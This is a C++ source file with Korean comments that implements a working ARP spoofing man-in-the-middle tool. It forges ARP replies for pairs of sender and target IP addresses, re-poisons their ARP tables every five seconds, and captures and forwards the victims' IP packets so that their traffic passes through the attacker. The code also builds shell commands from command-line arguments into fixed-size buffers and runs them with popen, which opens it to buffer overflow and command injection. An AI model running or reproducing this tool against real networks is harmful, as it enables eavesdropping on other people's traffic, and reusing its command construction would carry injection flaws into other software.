// scanf 보안 경고로 인한 컴파일 에러 방지
#define _CRT_SECURE_NO_WARNINGS
// 스레드 사용을 위한 라이브러리.
// make 파일에 lpthread 를 넣어야만
// 컴파일 시 에러가 나지 않습니다!
#include <pthread.h>
// 기본 입출력을 위한 라이브러리
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <string>
// 통신을 위한 네트워크 라이브러리
#include <unistd.h>
#include <cstdio>
#include <iostream>
#include <stdexcept>
#include <pcap.h>
#include <net/if.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include "arphdr.h"
#include "ethhdr.h"
#include "libnet-headers.h"

// 이더넷  패킷 구조체
struct EthArpPacket {
    // 이더넷 헤더를 담는 요소
    EthHdr eth_;
    // ARP 헤더를 담는 요소
    ArpHdr arp_;
};

// 통신 감청 대상 구조체
struct SenderInfo {
    // 대상의 IP를 담는 요소
    char ip[16];
    // 대상의 MAC을 담는 요소
    char mac[20];
    // 대상이 통신할 상대 IP를 담는 요소
    char targetIp[16];
    // 대상이 통신할 상대 MAC을 담는 요소
    char targetMac[20];
    // 대상의 ARP 테이블을 교란시킬 패킷을 장착하는 곳
    EthArpPacket arpPacket;
};

// 전역 변수. true인 동안 백그라운드에서 지속적으로 ARP 교란 패킷을 발송합니다.
bool isStart = false;
// 최대 50짝의 대상을 공격 대상으로 잡을 수 있도록합니다.
SenderInfo senderArray[100];
// 본인의 PC 네트워크 환경을 전역변수로 저장합니다.
char *myIp;
char *myMAC;
char *gatewayIp;
char *gatewayMAC;

// 패킷 통신 핸들을 전역변수로 설정하여 어디서든 접근 가능하도록 합니다.
pcap_t* handle;

// 사용법을 출력합니다.
void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> <sender ip> <target ip> ... (max 30 pair)\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// Linux 명령어를 실행시키고, 그 결과를 문자열로 가져오는 함수입니다.
// 인자로는 실행시킬 명령어가 들어갑니다.
char* exec(const char* cmd) {
    // 1024bytes 크기의 버퍼 배열을 준비합니다.
    char buffer[1024];
    // 결과를 담을 string 변수를 준비합니다.
    std::string result = "";
    // cmd 창을 열고 읽기 모드로 연결합니다.
    FILE* pipe = popen(cmd, "r");
    // 에러가 났을 경우
    if (!pipe) {
        // 에러를 뿜습니다.
        throw std::runtime_error("popen() failed!");
    }
    try {
        // 출력값이 NULL이 아닐 때 까지 명령어 출력문구를 가져옵니다.
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            // result 변수 안에 버퍼에 담긴 내용을 담습니다.
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    // 결과물을 담을 char 형식 변수를 result 문자열 크기 만큼 생성합니다.
    char *cstr = new char[result.length() + 1];
    // 결과물을 캐릭터형 변수에 담습니다.
    strcpy(cstr, result.c_str());
    // char 형태의 cmd 출력 결과를 반환합니다.
    return cstr;
}

// 커맨드를 실행 시킨 후, 출력 결과물을 띄어쓰기 단위로 잘라내어
// index 번 째 값을 반환시킵니다.
char* commandSplitter(const char* command, int index) {
    // 커맨드를 실행시키고, 그 결과를 담습니다.
    char *stra = exec(command);
    // 결과물을 자르기 위해 새 변수를 선언합니다.
    char *lineSplit;
    try{
        // 결과물로 부터 첫 번째 띄어쓰기 값을 가져옵니다.
        lineSplit = strtok(stra, " ");
        // 그 결과 NULL이 아닐 경우,
        if(lineSplit != NULL) {
            //  index 번 째 까지 띄어쓰기를 잘라냅니다.
            int count = 0;
            for(count = 0; count < index && lineSplit != NULL; count++) {
                lineSplit = strtok(NULL, " ");
            }
        // 결과가 NULL일 경우, NULL을 반환합니다.
        } else {
            return NULL;
        }
    } catch(...) {
        return NULL;
    }
    // 잘라내어 진 결과물을 반환합니다.
    return lineSplit;
}

// 일정 시간 마다 계속해서 ARP 패킷을 보내는 함수입니다.
// 스레드를 이용하여 백그라운드에서 동작합니다.
void *reInfection(void* arg) {
    // ARP 스푸핑이 계속되는 동안 반복합니다.
    while(isStart) {
        // 등록된 모든 교란 대상을 하나 씩 살펴봅니다.
        for(SenderInfo si : senderArray) {
            // 대상의 IP주소 길이가 4 이상일 경우
            if(strlen(si.ip) > 4) {
                // 대상에게 등록된 ARP 교란 패킷을 발사합니다.
                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&si.arpPacket), sizeof(EthArpPacket));
                // 에러가 났을 경우, 경고문을 출력 시킵니다.
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }
        }
        // 5초마다 반복합니다.
        sleep(5);
    }
}


// IP 패킷이 들어올 경우, 해당 데이터를 원래 목표 대상에게 재 전달 시켜 통신이 끊어지지 않도록 합니다.
void sendForwardPacket(const u_char* packet, char *srcMac, int size){
    // 패킷의 크기만큼 메모리에 할당합니다.
    u_char* forwardPacket=(u_char*)malloc(sizeof(char)*size);
    // 생성된 패킷에 원본 패킷을 복사합니다.
    memcpy(forwardPacket, packet, sizeof(char)*size);
    // 이더넷 헤더를 떼어서 봅니다.
    EthHdr* ethhdr = (EthHdr*) forwardPacket;
    
    // 등록된 모든 교란 대상 중
    for(SenderInfo si : senderArray) {
        // 발신자 MAC과 동일한 대상이 있을 경우
        if(strcmp(si.mac, srcMac) == 0) {
            // MAC 주소를 변조한 다음
            ethhdr -> smac_ = Mac(myMAC);
            ethhdr -> dmac_ = Mac(si.mac);
            // 변조된 패킷을 보냅니다.
            int res = pcap_sendpacket(handle, forwardPacket, size);
            // 에러가 날 경우, 에러메시지를 출력합니다.
            if(res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            // 뒤의 다른 등록 대상은 보지 않고, 반복문을 종료합니다.
            break;
        }
    }
    // 할당했던 메모리를 다시 반납합니다.
    free(forwardPacket);
}

// ARP 패킷을 보내는 함수입니다.
void sendArpPacket(char* senderIp){
    // 등록된 모든 교란 대상 중
    for(SenderInfo si : senderArray) {
        // 발신자 IP와 동일한 대상이 있을 경우
        if(strcmp(si.ip, senderIp) == 0) {
            // 대상에게 등록된 ARP 교란 패킷을 발사합니다.
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&si.arpPacket), sizeof(EthArpPacket));
            // 에러가 날 경우, 에러메시지를 출력합니다.
            if(res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            // 뒤의 다른 등록 대상은 보지 않고, 반복문을 종료합니다.
            return;
        }
    }
}

// 패킷을 캡쳐하여, 캡쳐된 패킷의 내용에 맞는 교란을 시행하는 함수입니다.
void *receivePacket(void* arg) {
    // 패킷 헤더를 구조체를 미리 선언합니다.
    struct pcap_pkthdr* header;
    // 패킷을 미리 선언합니다.
    const u_char* packet;
    // 이더넷 헤더를 미리 선언합니다.
    struct libnet_ethernet_hdr* ethHeader;
    // ARP 공격이 진행 중인 동안 패킷 수집을 지속합니다.
    while (isStart) {
        // 수집된 패킷을 가져옵니다.
        int res = pcap_next_ex(handle, &header, &packet);
        // 수집 결과가 없다면, 재 시도합니다.
        if (res == 0) continue;
        // 수집에 실패했다면, 패킷 수집을 종료합니다.
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        // 패킷의 이더넷 헤더를 발라냅니다.
        ethHeader = (struct libnet_ethernet_hdr*) packet;
        // 이더넷 헤더로 부터 IP헤더를 발라냅니다.
        struct libnet_ipv4_hdr* ipHeader = (struct libnet_ipv4_hdr*) (packet + sizeof(struct libnet_ethernet_hdr));
        // 발신지와 수신지 IP를 구합니다.
        char* srcIp = inet_ntoa(ipHeader->ip_src);
        char* dstIp = inet_ntoa(ipHeader->ip_dst);
        
        // 내가 보낸 패킷이거나, 나에게 오는 패킷일 경우, 통과시켜 줍니다.
        if(strcmp(srcIp, myIp) == 0 || strcmp(dstIp, myIp) == 0)
            continue;
        
        // ARP 패킷일 경우
        if(ntohs(ethHeader->ether_type) == ETHERTYPE_ARP) {
            // 패킷을의 ARP 헤더를 발라냅니다.
            struct libnet_arp_hdr* arpHeader;
            arpHeader = (struct libnet_arp_hdr*) (packet + sizeof(struct libnet_ethernet_hdr));
            
            // 어디로 패킷인지 수신지 MAC주소를 얻어냅니다.
            char *dstMAC;
            struct ether_addr host;
            memcpy(&host, ethHeader->ether_dhost, sizeof(host));
            dstMAC = ether_ntoa(&host);
            
            // 수신지가 ff:ff:ff:ff:ff:ff(브로드캐스트) 이거나,
            // ARP Request에 대한 Reply 패킷일 경우
            if(strcmp(dstMAC, "ff:ff:ff:ff:ff:ff") == 0 || arpHeader -> ar_op == ARPOP_REPLY){
                // 대상 IP에게 변조 ARP 패킷을 전송합니다.
                sendArpPacket(srcIp);
                printf("[SEND TO SRCMAC INFECTED REPLY] : %s\n", dstMAC);
            // ARP Request 패킷일 경우
            } else if(arpHeader -> ar_op == ARPOP_REQUEST) {
                // 목적 IP에게 변조 ARP 패킷을 전송합니다.
                sendArpPacket(dstIp);
            }
        // 만일 IP 패킷일 경우,
        } else if(ntohs(ethHeader->ether_type) == ETHERTYPE_IP) {
            // 발신자가 누군지 여쭙습니다.
            char *srcMac;
            struct ether_addr host;
            memcpy(&host, ethHeader->ether_shost, sizeof(host));
            srcMac = ether_ntoa(&host);
            // 등록된 모든 교란 대상 중
            for(SenderInfo si : senderArray) {
                // 동일 IP 주소를 가지고 있는 대상이 발견 될 경우
                if(strlen(si.ip) > 4 && strcmp(si.mac, srcMac) == 0) {
                    // 해당 패킷을 변조하여 수신 대상에게 전달합니다.
                    sendForwardPacket(packet, srcMac, header->len);
                    printf("[FOWARDING] : %s\n", srcMac);
                }
            }
        }
    }
    // ARP 공격이 끝날 경우, 통신을 닫습니다.
    pcap_close(handle);
}

// 문자열 바꾸기 함수가 기본으로 주어지지 않아서 등록한 문자열 바꾸기 함수입니다.
char *replace(char *st, char *orig, char *repl) {
    static char buffer[4096];
    char *ch;
    if (!(ch = strstr(st, orig)))
        return st;
    strncpy(buffer, st, ch-st);  
    buffer[ch-st] = 0;
    sprintf(buffer+(ch-st), "%s%s", repl, ch+strlen(orig));
    return buffer;
}

// grep 명령어로 잡은 MAC 주소는 07:08:01:06:81:00 으로 나온다면,
// dstMAC = ether_ntoa(&host) 로 나온 MAC 주소는 7:8:1:6:81:0으로 나오기에
// strcmp()함수가 먹히지 않았습니다.
// 이에 mac 주소 구조를 동일하게 맞춰 주기 위한 함수를 만들었습니다.
char * macAfee(char *mac){
    mac = replace(mac, ":0", ":");
    mac = replace(mac, "00", "0");
    mac = replace(mac, "01", "1");
    mac = replace(mac, "02", "2");
    mac = replace(mac, "03", "3");
    mac = replace(mac, "04", "4");
    mac = replace(mac, "05", "5");
    mac = replace(mac, "06", "6");
    mac = replace(mac, "07", "7");
    mac = replace(mac, "08", "8");
    mac = replace(mac, "09", "9");
    mac = replace(mac, "0a", "a");
    mac = replace(mac, "0b", "b");
    mac = replace(mac, "0c", "c");
    mac = replace(mac, "0d", "d");
    mac = replace(mac, "0e", "e");
    mac = replace(mac, "0f", "f");
    return mac;
}

// 프로그램이 실행되면 제일 처음 동작할 main함수입니다.
int main(int argc, char* argv[]) {
    // 인자값은 최소 4개 이상 받으며, 100개 이하까지 입력이 가능합니다.
    // 거기에 발신자-수신자 짝이 맞지 않을 경우, 사용법을 알려줍니다.
    if (argc < 4 || argc > 100 || argc % 2 == 1) {
        usage();
        return -1;
    }
    
    // 내 PC의 MAC주소를 알아옵니다.
    char macCommand[] = "cat /sys/class/net/";
    strcat(macCommand, argv[1]);
    strcat(macCommand, "/address");
    myMAC = exec(macCommand);
    myMAC[strlen(myMAC) - 1] = '\0';
    myMAC = macAfee(myMAC);
    
    // 내 PC의 IP 주소를 알아옵니다.
    char myIpCommand[] = "ifconfig ";
    strcat(myIpCommand, argv[1]);
    strcat(myIpCommand, " | grep inet");
    myIp  = commandSplitter(myIpCommand, 1);

    // 게이트웨이의 IP 주소를 알아옵니다.
    gatewayIp = exec("arp -a | grep _gateway | cut -f 2 -d '(' | cut -f 1 -d ')'");
    gatewayIp[strlen(gatewayIp) - 1] = '\0';
    // 게이트웨이의 MAC주소를 알아옵니다.
    gatewayMAC = commandSplitter("arp -a | grep _gateway", 3);
    gatewayMAC = macAfee(gatewayMAC);
    
    // 얻어낸 정보를 출력합니다.
    printf("My IP : %s (len : %d)\n", myIp, strlen(myIp));
    printf("My MAC : %s (len : %d)\n", myMAC, strlen(myMAC));
    printf("Gateway IP : %s (len : %d)\n", gatewayIp, strlen(gatewayIp));
    printf("Gateway MAC : %s (len : %d)\n", gatewayMAC, strlen(gatewayMAC));
    
    // 파라미터로 입력 받은 모든 주소에 대한 ping을 날려
    // 동일망에 있는 기기의 경우, ARP테이블에 등록합니다.
    int count = 2;
    for(count = 2; count < argc; count++) {
        char pingSender[] = "ping ";
        strcat(pingSender, argv[count]);
        strcat(pingSender, " -c 1");
        exec(pingSender);
    }
    
    // 발신자-수신자 짝이 시작 되는 2번째 파라미터 부터
    // 입력한 파라미터의 끝 까지 아래 구문을 반복합니다.
    // 한 바퀴 반복 할 때 마다 2칸 씩 건너 뛰어
    // 발신자-수신자 짝으로 처리하게 합니다.
    for(count = 2; count < argc; count+=2) {
        // 발신자 IP는 파라미터에서 바로 받아옵니다.
        char *senderIp = argv[count];
        // 발신자 MAC주소를 받아옵니다.
        char senderArpCommand[] = "arp -a | grep ";
        strcat(senderArpCommand, argv[count]);
        char *senderMAC = commandSplitter(senderArpCommand, 3);
        if(senderMAC == NULL ||  strcmp(senderMAC, "<incomplete>") == 0) {
            // 내부망이 아닐 경우, MAC주소를 얻지 못하므로,
            // 그 대는 게이트웨이 MAC 주소를 설정합니다.
            senderMAC = gatewayMAC;
        }
        // 수신자 IP도 파라미터에서 바로 받아옵니다.
        char *targetIp = argv[count+1];
        char targetArpCommand[] = "arp -a | grep ";
        strcat(targetArpCommand, argv[count+1]);
        char *targetMAC = commandSplitter(targetArpCommand, 3);
        if(targetMAC == NULL || strcmp(targetMAC, "<incomplete>") == 0) {
            // 내부망이 아닐 경우, MAC주소를 얻지 못하므로,
            // 그 대는 게이트웨이 MAC 주소를 설정합니다.
            targetMAC = gatewayMAC;
        }
        // 발신자 및 수신자의 MAC을 프로그램에서 사용되는 공통 MAC 구조에 맞게 저장합니다.
        senderMAC = macAfee(senderMAC);
        targetMAC = macAfee(targetMAC);
    
        // 교란 대상 배열에 발신자 및 수신자의 IP, MAC 주소를 저장합니다.
        strcpy(senderArray[count-2].ip, argv[count]);
        strcpy(senderArray[count-2].mac, senderMAC);
        strcpy(senderArray[count-2].targetIp, argv[count+1]);
        strcpy(senderArray[count-2].targetMac, targetMAC);
        strcpy(senderArray[count-1].ip, argv[count+1]);
        strcpy(senderArray[count-1].mac, targetMAC);
        strcpy(senderArray[count-1].targetIp, argv[count]);
        strcpy(senderArray[count-1].targetMac, senderMAC);
                
        // 교란 대상 배열에 발신자 및 수신자의 ARP 교란 패킷을 생성합니다.
        senderArray[count-2].arpPacket.eth_.dmac_ = Mac(senderMAC);
        senderArray[count-2].arpPacket.eth_.smac_ = Mac(myMAC);
        senderArray[count-2].arpPacket.arp_.smac_ = Mac(myMAC);
        senderArray[count-2].arpPacket.arp_.sip_ = htonl(Ip(targetIp));
        senderArray[count-2].arpPacket.arp_.tmac_ = Mac(senderMAC);
        senderArray[count-2].arpPacket.arp_.tip_ = htonl(Ip(senderIp));
        senderArray[count-2].arpPacket.eth_.type_ = htons(EthHdr::Arp);
        senderArray[count-2].arpPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
        senderArray[count-2].arpPacket.arp_.pro_ = htons(EthHdr::Ip4);
        senderArray[count-2].arpPacket.arp_.hln_ = Mac::SIZE;
        senderArray[count-2].arpPacket.arp_.pln_ = Ip::SIZE;
        senderArray[count-2].arpPacket.arp_.op_ = htons(ArpHdr::Reply);
        
        senderArray[count-1].arpPacket.eth_.dmac_ = Mac(targetMAC);
        senderArray[count-1].arpPacket.eth_.smac_ = Mac(myMAC);
        senderArray[count-1].arpPacket.arp_.smac_ = Mac(myMAC);
        senderArray[count-1].arpPacket.arp_.sip_ = htonl(Ip(senderIp));
        senderArray[count-1].arpPacket.arp_.tmac_ = Mac(targetMAC);
        senderArray[count-1].arpPacket.arp_.tip_ = htonl(Ip(targetIp));
        senderArray[count-1].arpPacket.eth_.type_ = htons(EthHdr::Arp);
        senderArray[count-1].arpPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
        senderArray[count-1].arpPacket.arp_.pro_ = htons(EthHdr::Ip4);
        senderArray[count-1].arpPacket.arp_.hln_ = Mac::SIZE;
        senderArray[count-1].arpPacket.arp_.pln_ = Ip::SIZE;
        senderArray[count-1].arpPacket.arp_.op_ = htons(ArpHdr::Reply);
        
    }
    // 교란 대상으로 등록된 모든 짝을 사용자에게 보여줍니다.
    for(SenderInfo si : senderArray) {
        if(strlen(si.ip) > 4) {
            printf("[IP]%s [MAC]%s / [TIP]%s [TMAC]%s\n", si.ip, si.mac, si.targetIp, si.targetMac);
        }
    }
    
    // 선택한 네트워크 디바이스와 연결을 시도합니다.
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    // 연결 실패 시 프로그램을 종료합니다.
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    // 전역변수에 시작했음을 알립니다.
    isStart = true;
    
    // 패킷 수집 스레드를 생성하고, 가동시킵니다.
    pthread_t receivePacketThread;
    int threadId = pthread_create(&receivePacketThread, NULL, receivePacket, NULL);
    if (threadId < 0) {
        perror("[×] Receive Packet 스레드 생성에 실패하였습니다!");
        exit(0);
    }
    
    // ARP 테이블 지속 감염 스레드를 생성하고, 가동시킵니다.
    pthread_t reInfectionThread;
    int threadId2 = pthread_create(&reInfectionThread, NULL, reInfection, NULL);
    if (threadId2 < 0) {
        perror("[×] Reinjection 스레드 생성에 실패하였습니다!");
        exit(0);
    }
    
    // 프로그램이 바로 끝나지 않게 막아줍니다.
    int selected = 0;
    while(true) {
        scanf("%d", &selected);
        if(selected == -1) {
            break;
        }
    }
    // 만일 끝내기를 했을 경우, 모든 연결을 닫습니다.
    isStart = false;
    pcap_close(handle);
    return 0;
}

